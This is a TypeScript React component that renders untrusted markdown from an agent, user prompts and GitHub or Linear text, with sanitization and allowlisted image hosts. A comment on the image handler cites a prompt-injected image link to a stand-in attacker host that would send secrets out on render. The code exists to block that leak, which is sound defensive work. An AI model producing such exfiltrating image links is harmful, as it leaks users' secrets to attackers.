import type { Element, ElementContent } from "hast";
import { type ComponentProps, memo } from "react";
import ReactMarkdown, { type Components, defaultUrlTransform } from "react-markdown";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import { TICKET_MEDIA_PATH } from "../../src/shared/tickets";
import { CodeBlock, CodeBlockActions, CodeBlockContent, CodeBlockCopyButton, CodeBlockHeader, CodeBlockLine, CodeBlockTitle } from "@/components/ui/code-block";
import { highlightLines } from "../code-highlight";
import type { PullRequestDetail } from "../../src/shared/github";
import { remarkFilePaths, textFilePath } from "../file-paths";
import { remarkPromptChips } from "../prompt-tokens";
import { useRead } from "../reads";
import { FileLink } from "./file-link";
import { BrandMark, LINEAR_LOGO, SLACK_LOGO } from "./integrations/brand-logos";
import { OrgIcon } from "./org-icon";
import { isChipKind, PromptChip } from "./prompt-chip";

/** Where text written on GitHub may load images from. The page's CSP allows the same hosts. */
const GITHUB_IMAGE_PREFIXES = [
	"https://avatars.githubusercontent.com/",
	"https://github.com/user-attachments/",
	"https://private-user-images.githubusercontent.com/",
	"https://user-images.githubusercontent.com/",
];

const INLINE_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/i;

const inlineImage = (src: string): boolean => INLINE_IMAGE.test(src);
/** A file of a Linear issue, which this server fetches from Linear: the issue's markdown names it so. */
const ticketMedia = (src: string): boolean => src.startsWith(`${TICKET_MEDIA_PATH}?`);
const githubImage = (src: string): boolean => inlineImage(src) || ticketMedia(src) || GITHUB_IMAGE_PREFIXES.some(prefix => src.startsWith(prefix));

/**
 * An image that loads only from where `allowed` says. Any other would be fetched the moment the text renders, so a
 * prompt-injected `![](https://attacker/?q=<secrets>)` would leak; it shows as a link to the image instead.
 */
const imageFrom =
	(allowed: (src: string) => boolean): Components["img"] =>
	({ node: _node, ...props }: ComponentProps<"img"> & { node?: unknown }) => {
		const { src, alt } = props;
		if (typeof src !== "string" || src === "") return <>{alt}</>;
		if (allowed(src)) return <img {...props} />;
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{alt || src}
			</a>
		);
	};

function ExternalLink({ href, children, ...props }: ComponentProps<"a">) {
	let service: "linear" | "github" | "graphite" | "slack" | null = null;
	let label = "";
	let favicon: string | null = null;
	let titleUrl: string | null = null;
	const bare = children === href || children === href?.replace(/^https?:\/\//, "");
	try {
		const url = new URL(href ?? "");
		if (url.protocol === "https:" || url.protocol === "http:") {
			const host = url.hostname;
			favicon = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(host)}&sz=32`;
			if (host === "linear.app") {
				service = "linear";
				label = url.pathname.match(/\/issue\/([^/]+)/)?.[1] ?? "Linear";
			} else if (host === "github.com" || host === "www.github.com") {
				service = "github";
				const pr = url.pathname.match(/^\/([^/]+)\/([^/]+)\/(?:pull|issues)\/(\d+)/);
				label = pr ? `${pr[1]}/${pr[2]} #${pr[3]}` : url.pathname.split("/").filter(Boolean).slice(0, 2).join("/") || "GitHub";
				const pull = url.pathname.match(/^\/([^/]+)\/([^/]+)\/pull\/(\d+)(?:\/|$)/);
				if (pull) titleUrl = `/api/pull-request/title?${new URLSearchParams({ owner: pull[1]!, repo: pull[2]!, number: pull[3]! })}`;
			} else if (host === "app.graphite.com" || host === "app.graphite.dev") {
				service = "graphite";
				const pr = url.pathname.match(/^\/github\/pr\/([^/]+)\/([^/]+)\/(\d+)/);
				label = pr ? `${pr[1]}/${pr[2]} #${pr[3]}` : "Graphite";
				if (pr) titleUrl = `/api/pull-request/title?${new URLSearchParams({ owner: pr[1]!, repo: pr[2]!, number: pr[3]! })}`;
			} else if (host === "slack.com" || host.endsWith(".slack.com")) {
				service = "slack";
				label = url.pathname.includes("/archives/") ? "Slack message" : "Slack";
			}
		}
	} catch {
		// Relative and filtered URLs keep their original label.
	}
	const title = useRead<Pick<PullRequestDetail, "title">>(bare && !props.title ? titleUrl : null);
	return (
		<a {...props} href={href} target="_blank" rel="noopener noreferrer">
			{favicon ? (
				<>
					{service === "linear" || service === "slack" ? (
						<BrandMark logo={service === "linear" ? LINEAR_LOGO : SLACK_LOGO} className="mr-1 inline-flex size-3 align-middle" />
					) : service ? (
						<OrgIcon org={service} className="mr-1 inline-block align-middle" />
					) : (
						<img src={favicon} alt="" className="mr-1 inline-block size-3 align-middle" loading="lazy" referrerPolicy="no-referrer" />
					)}
					<span className="font-semibold underline">{service && bare ? props.title || title.data?.title || label : children}</span>
				</>
			) : children}
		</a>
	);
}

const link: Components["a"] = ({ node: _node, ...props }) => <ExternalLink {...props} />;

/** A video that plays only a Linear issue's file; any other source shows as a link to it. */
const video: Components["video"] = ({ node: _node, src }) => {
	if (typeof src !== "string" || src === "") return null;
	if (!ticketMedia(src)) {
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{src}
			</a>
		);
	}
	return (
		<video controls preload="metadata" src={src} className="max-h-[70vh] w-full rounded-md bg-black">
			<a href={src} target="_blank" rel="noopener noreferrer">
				Download the video
			</a>
		</video>
	);
};

/** A link in agent text: a text file's path opens in the file dialog, anything else in a new tab. */
const agentLink: Components["a"] = ({ href, children, node: _node, ...props }) => {
	const path = href === undefined ? null : textFilePath(href);
	return path === null ? (
		<ExternalLink {...props} href={href}>{children}</ExternalLink>
	) : (
		<FileLink path={path}>{children}</FileLink>
	);
};

/** A reference in a sent prompt, which `remarkPromptChips` marks; a ticket or pull request still opens. Any other `span` stays one. */
const promptChip: Components["span"] = ({ node, ...props }) => {
	const { dataChip: kind, dataLabel: label, dataTarget: target } = node?.properties ?? {};
	if (!isChipKind(kind) || typeof label !== "string" || typeof target !== "string") return <span {...props} />;
	const chip = <PromptChip kind={kind} label={label} target={target} />;
	return kind === "ticket" || kind === "pull-request" ? (
		<a href={target} target="_blank" rel="noopener noreferrer" className="no-underline">
			{chip}
		</a>
	) : (
		chip
	);
};

const textOf = (node: Element | ElementContent): string =>
	node.type === "text" ? node.value : node.type === "element" ? node.children.map(textOf).join("") : "";

/** A code block, colored by its fence's language, which titles it, with a copy button. A `<pre>` in GitHub's raw HTML has no `<code>` and no language. */
const codeBlock: Components["pre"] = ({ node }) => {
	const code = node?.children.find((child): child is Element => child.type === "element" && child.tagName === "code");
	const className = code?.properties.className;
	const language = (Array.isArray(className) ? className : []).map(String).find(name => name.startsWith("language-"))?.slice("language-".length) ?? null;
	const text = node ? textOf(code ?? node).replace(/\n$/, "") : "";
	const copy = <CodeBlockCopyButton value={text} />;
	return (
		<CodeBlock>
			{language ? (
				<CodeBlockHeader>
					<CodeBlockTitle>{language}</CodeBlockTitle>
					<CodeBlockActions>{copy}</CodeBlockActions>
				</CodeBlockHeader>
			) : (
				<CodeBlockActions>{copy}</CodeBlockActions>
			)}
			<CodeBlockContent>
				{highlightLines(text, language ?? "").map((tokens, index) => (
					<CodeBlockLine key={index}>
						{tokens.map((token, at) => (token.className ? <span key={at} className={token.className}>{token.text}</span> : token.text))}
					</CodeBlockLine>
				))}
			</CodeBlockContent>
		</CodeBlock>
	);
};

const AGENT_COMPONENTS: Components = { a: agentLink, img: imageFrom(inlineImage), pre: codeBlock };
const PROMPT_COMPONENTS: Components = { ...AGENT_COMPONENTS, span: promptChip };
const GITHUB_COMPONENTS: Components = { a: link, img: imageFrom(githubImage), video, pre: codeBlock };

/** GitHub's schema, plus the `<video>` a Linear issue's recording becomes. */
const SANITIZE_SCHEMA = {
	...defaultSchema,
	tagNames: [...(defaultSchema.tagNames ?? []), "video"],
	attributes: { ...defaultSchema.attributes, video: ["src"] },
};

const GITHUB_PLUGINS = [rehypeRaw, [rehypeSanitize, SANITIZE_SCHEMA]] satisfies ComponentProps<typeof ReactMarkdown>["rehypePlugins"];
const REMARK_PLUGINS = [remarkGfm];
const AGENT_REMARK_PLUGINS = [remarkGfm, remarkFilePaths];
const PROMPT_REMARK_PLUGINS = [remarkGfm, remarkPromptChips, remarkFilePaths];

/** react-markdown drops `data:` URLs; the images the page allows inline are the exception. */
const urlTransform = (url: string, key: string): string => (key === "src" && inlineImage(url) ? url : defaultUrlTransform(url));

/**
 * In agent text a `file://` link also keeps its path, which the file dialog opens. One whose escapes do not decode drops
 * as any other unsafe scheme does, since agent text must not throw while the page renders.
 */
const agentUrlTransform = (url: string, key: string): string => {
	if (key !== "href" || !url.startsWith("file:///")) return urlTransform(url, key);
	try {
		return decodeURI(url.slice("file://".length));
	} catch {
		return defaultUrlTransform(url);
	}
};

/**
 * Markdown text is untrusted. react-markdown escapes raw HTML and filters unsafe link schemes. Images load only inline
 * (`data:`), or, for `github`, from GitHub's own hosts and from this server's route for a Linear issue's files, which
 * also plays its videos. `github`: text written on GitHub or Linear, whose raw HTML renders as GitHub renders it,
 * through rehype-sanitize's schema, which follows GitHub's; HTML comments drop out, as GitHub hides them. In agent
 * text, the path of a text file opens it in the file dialog, a relative one against `FileBaseContext`. `prompt`: a
 * user's prompt, read as agent text with its skill, command, file, ticket, pull request, todo, and session references as chips.
 *
 * Parsing and highlighting a long reply is the page's costliest render, so the same text never renders twice.
 */
export const MessageMarkdown = memo(function MessageMarkdown({ text, github = false, prompt = false }: { text: string; github?: boolean; prompt?: boolean }) {
	return (
		<div className="message-markdown max-w-full whitespace-normal break-words">
			<ReactMarkdown
				remarkPlugins={github ? REMARK_PLUGINS : prompt ? PROMPT_REMARK_PLUGINS : AGENT_REMARK_PLUGINS}
				rehypePlugins={github ? GITHUB_PLUGINS : undefined}
				components={github ? GITHUB_COMPONENTS : prompt ? PROMPT_COMPONENTS : AGENT_COMPONENTS}
				urlTransform={github ? urlTransform : agentUrlTransform}
			>
				{text}
			</ReactMarkdown>
		</div>
	);
});
